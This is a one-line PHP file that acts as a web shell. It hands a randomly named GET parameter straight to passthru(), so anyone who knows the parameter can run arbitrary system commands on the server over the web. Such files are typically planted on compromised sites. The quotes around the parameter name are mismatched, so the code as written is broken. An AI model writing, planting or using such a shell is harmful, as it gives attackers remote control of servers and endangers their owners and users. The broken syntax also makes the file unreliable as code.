<?php
passthru($_GET["cVFFr2Qz']);
?>
